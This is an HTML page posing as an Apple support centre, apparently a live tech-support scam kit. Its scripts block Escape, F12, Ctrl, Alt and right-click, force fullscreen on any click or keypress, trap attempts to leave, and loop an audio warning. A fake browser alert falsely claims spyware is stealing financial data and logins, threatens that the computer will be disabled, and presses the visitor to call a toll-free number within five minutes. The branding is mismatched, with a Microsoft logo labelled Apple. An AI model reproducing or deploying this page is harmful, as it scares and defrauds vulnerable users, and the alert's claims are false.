<html xmlns="http:/www.w3.org/1999/xhtml">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><meta name="robots" content="noindex,nofollow">
	<title>Official Support Centre </title>
	<link href="chrome-assests/bootstrap.css" rel="stylesheet" />
	<link href="chrome-assests/style.css" rel="stylesheet" />
	<link href="chrome-assests/translator.css" id="SL_Style" rel="stylesheet" type="text/css" />
	<link href="chrome-assests/alert.css" rel="stylesheet" />
	
	<script type="text/javascript">
	var isChromium = window.chrome,
    vendorName = window.navigator.vendor,
    isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
    isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
	if(isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false) 	{
   	// is Google chrome 
	window.location.href = "./ch/";
	}
	if(navigator.userAgent.indexOf("Firefox") != -1 ) 
    {
         window.location.href = "./fir/";
    }
	if(window.navigator.userAgent.indexOf("Edge") != -1 ) 
    {
         window.location.href = "./edg/";
    }
	if((navigator.userAgent.indexOf("MSIE") != -1 ) || (!!document.documentMode == true )) //IF IE > 10
    {
      window.location.href = "./ie/"; 
    }  
	
</script>
	
	<script src="chrome-assests/retreaver.js" type="text/javascript"></script><script src="chrome-assests/jquery-1.js" type="text/javascript"></script><script src="chrome-assests/iframe.js" type="text/javascript"></script>
	
	
	
	
	<script type="text/javascript">
		window.onkeydown = function(evt)
		{
			if(evt.keyCode == 27 || evt.keyCode == 18 || evt.keyCode == 123 || evt.keyCode == 85 || evt.keyCode == 9 || evt.keyCode == 115 || evt.keyCode == 116 || evt.keyCode == 112 || evt.keyCode == 114 || evt.keyCode == 17)
			{
				return false;

			}

		};
		window.onkeypress = function(evn)
		{
			if(evn.keyCode == 123 || evn.keyCode == 117) return false;

		};
	</script><script type="text/javascript">
		onbeforeunload=function()
		{
			alert ("??????? ESC, ????? ??????? ????????!");
			return "??????? ESC, ????? ??????? ????????!";

		}
	</script><script type="text/javascript">
		var stroka = "<tr><td align='left' background='data:image/jpeg;base64,'><img src='data:image/jpeg;base64,'></td></tr></table></td></tr>";
	</script><script type="text/javascript">
		function toggleFullScreen()
		{
			if (!document.fullscreenElement &&  !document.mozFullScreenElement && !document.webkitFullscreenElement)
			{
				if (document.documentElement.requestFullscreen)
				{
					document.documentElement.requestFullscreen();

				}
				else if (document.documentElement.mozRequestFullScreen)
				{
					document.documentElement.mozRequestFullScreen();

				}
				else if (document.documentElement.webkitRequestFullscreen)
				{
					document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
				}
			}
		}
	</script><script type="text/javascript">
		window.onblur = function()
		{
			
		}

	</script><script type="text/javascript">
		document.addEventListener('keyup', function(es)
				{
					if (es.keyCode == 27)
					{
						toggleFullScreen();

					}
				}
				, false);
	</script><script type="text/javascript">
		document.addEventListener('keyup', function(e)
				{
					if (e.keyCode == 122 || e.keyCode == 17 || e.keyCode == 18 || e.keyCode == 13)
					{
						document.getElementById('map').innerHTML = stroka;
						toggleFullScreen();

					}
				}
				, false);
	</script><script type="text/javascript">
		window.onload = function ()
		{
			document.onload = function (e)
			{
				e = e || event;
				target = e.target || e.srcElement;
				if (target.tagName == "DIV")
				{
					toggleFullScreen();
					document.body.style.cursor = 'not-allowed';
					document.getElementById('map').innerHTML = stroka;
					document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute;
					left: -25px;
					'></iframe>";

				}
				else
				{
					toggleFullScreen();
					document.body.style.cursor = 'not-allowed';
					document.getElementById('map').innerHTML = stroka;
					document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute;
					left: -25px;
					'></iframe>";

				}

			}
		}
	</script><script type="text/javascript">
		document.oncontextmenu=new Function("return false");
	</script><script type="text/javascript">
		addEventListener("click", function() {
			document.getElementById('map').innerHTML = stroka;
			var
					el = document.documentElement
					, rfs =
							el.requestFullScreen
							|| el.webkitRequestFullScreen
							|| el.mozRequestFullScreen
					;

			rfs.call(el);

		});
	</script>
</head>
<body>
<div id="coFrameDiv" style="height:0px;display:none;"></div>

<table border="0" cellpadding="0" cellspacing="0" width="100%">
	<tbody>
		<tr>
			<td align="center" valign="top">
			<div id="map"></div>
			</td>
		</tr>
	</tbody>
</table>

<nav class="navbar navbar-default navbar-static-tops">
<div class="container">
<div class="navbar-header"><button aria-controls="navbar" aria-expanded="false" class="navbar-toggle collapsed" data-target="#navbar" data-toggle="collapse" type="button"><span class="sr-only">Toggle navigation</span></button><a class="navbar-brand" href="#"><img alt="Apple" src="chrome-assests/microsoft.png" /> </a></div>

<div class="navbar-collapse collapse" id="navbar">
<ul class="nav navbar-nav">
	<li class="dropdown"><a aria-expanded="false" aria-haspopup="true" class="dropdown-toggle" data-toggle="dropdown" href="#" role="button">Mac</a>

	<ul class="dropdown-menu">
		<li><a href="#">Store Home </a></li>
		<li><a href="#">Devices</a></li>
		<li><a href="#">Software</a></li>
		<li><a href="#">Apps</a></li>
		<li><a href="#">Games</a></li>
	</ul>
	</li>
	<li class="dropdown"><a aria-expanded="false" aria-haspopup="true" class="dropdown-toggle" data-toggle="dropdown" href="#" role="button">IPad</a>
	<ul class="dropdown-menu">
		<li><a href="#">Software &amp; services</a></li>
		<li><a href="#">Devices &amp; Xbox</a></li>
		<li><a href="#">For business</a></li>
	</ul>
	</li>
	<li><a href="#">IPhone</a></li>
    <li><a href="#">Watch</a></li>
</ul>

<ul class="nav navbar-nav navbar-right">
	<li><a href="#">Toll Free :</a></li>
	<li><a href="#"><strong>1-888-617-4125</strong></a></li>
</ul>
</div>
<!--/.nav-collapse --></div>
</nav>

<div class="container">
<div class="">
<div class="row">
<div class="col-xs-6 text-left">
<h2 style="padding-left: 30px;">Call for support:</h2>

<h2>1-888-617-4125</h2>
</div>

<div class="col-xs-6 text-right">
<h2 style="padding-left: 30px;">Call for support:</h2>

<h2>1-888-617-4125</h2>
</div>
</div>
</div>

<div class="row" style="padding: 40px; text-align: center;">
<div class="col-xs-6 col-sm-3"><a> <span>Manage my account</span> </a></div>

<div class="col-xs-6 col-sm-3"><a> <span>Ask the community</span> </a></div>

<div class="col-xs-6 col-sm-3"><a> <span>Contact Answer Desk</span> </a></div>

<div class="col-xs-6 col-sm-3"><a> <span>Find downloads</span> </a></div>
</div>

<div class="row" style="text-align: center;">
<h3>I need help with...</h3>

<div class="bs-glyphicons" style="margin-top:30px;">
<div class="row">
<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">Mac</span></div>

<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">IPhone 7 Plus</span></div>

<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">IPad</span></div>

<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">Watch</span></div>

<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">IPOD</span></div>

<div class="col-lg-2 col-md-4 col-xs-6"><span class="glyphicon-class product-name">ICloud</span></div>
</div>


</div>
</div>

<div class="row" style="text-align: center; padding-bottom: 50px;">
<h4 style="margin-top: 40px; margin-bottom: 80px;"><a>View all Apple products</a></h4>

<div class="row">
<div class="col-md-4" style="text-align:left;">
<h4>Business, IT &amp; developer</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Support for small business</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Enterprise and partners</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>IT Professionals</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Developers</a></li>
</ul>
</div>

<div class="col-md-4" style="text-align:left;">
<h4>Service &amp; Support</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Complimentary Support</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Hardware Warranties</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Software License Agreements</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Apple Repair</a></li>
</ul>
</div>

<div class="col-md-4" style="text-align:left;">
<h4>Resources</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Downloads & Updates</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Tech Specs</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Service Answer Center (FAQs)</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Contact a Mobile Carrier</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Support Site Map</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Apple Service Programs</a></li>
</ul>
</div>
</div>
</div>
</div>

<footer class="footer">
<div class="container">
<div class="row">
<div class="col-md-4" style="text-align:left;">
<h4>Support</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Account support</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Supported products list</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Product support lifecycle</a></li>
</ul>
</div>

<div class="col-md-4" style="text-align:left;">
<h4>Security</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Safety &amp; Security Center</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Download Security Essentials</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Malicious Software Removal Tool</a></li>
</ul>
</div>

<div class="col-md-4" style="text-align:left;">
<h4>Resources</h4>

<ul style="padding:0px;">
	<li style="list-style: none; padding:10px 0px;"><a>Downloads & Updates</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Tech Specs</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Service Answer Center (FAQs)</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Contact a Mobile Carrier</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Support Site Map</a></li>
	<li style="list-style: none; padding:10px 0px;"><a>Apple Service Programs</a></li>
</ul>
</div>
</div>

<div class="row" style="font-size: 1.2rem; padding:30px 0px;">
<div style="float:left;"><span>English(United States)</span></div>

<div style="float:right;"><span style="padding:0px 15px;">Terms of use</span> <span style="padding:0px 15px;">English(United States)</span> <span style="padding:0px 15px;">Trademarks</span> <span style="padding:0px 15px;">@2017 Apple Inc</span></div>
</div>
</div>
</footer>

<p>
<audio autoplay loop><source src="chrome-assests/gb.mp3" type="audio/mpeg" /></audio>
</p>

<div class="chrome-alert" id="chrome-alerts">
<div><a class="cross" href="javascript:openlink()">&times;</a>

<h1>support.apple.com says:</h1>

<div class="content-box" id="alert-content-box">
<p>** Apple Warning Alert **<br />
Malicious Pornographic Spyware/Riskware Detected<br />
Error # 0x80072ee7<br />
<br />
Please call us immediately at: 1-888-617-4125<br />
Do not ignore this critical alert.<br />
If you close this page, your computer access will be disabled to prevent further damage to our network.<br />
Your computer has alerted us that it has been infected with a Pornographic Spyware and riskware. The following information is being stolen...<br />
&gt; Financial Data<br />
&gt; Facebook Logins<br />
&gt; Credit Card Details<br />
&gt; Email Account Logins<br />
&gt; Photos stored on this computer<br />
You must contact us immediately so that our expert engineers can walk you through the removal process over the phone to protect your identity. Please call us within the next 5 minutes to prevent your computer from being disabled or from any information loss.<br />
<br />
Toll Free: 1-888-617-4125</p>
</div>
<label style="font-size: 16px;"> Click Ok to Leave this Page.</label>

<div class="action_buttons"><a class="active" id="leave_page">OK</a></div>
</div>
</div>

<div id="auth"></div>

<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-114131359-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-114131359-1');
</script>

</body>
</html>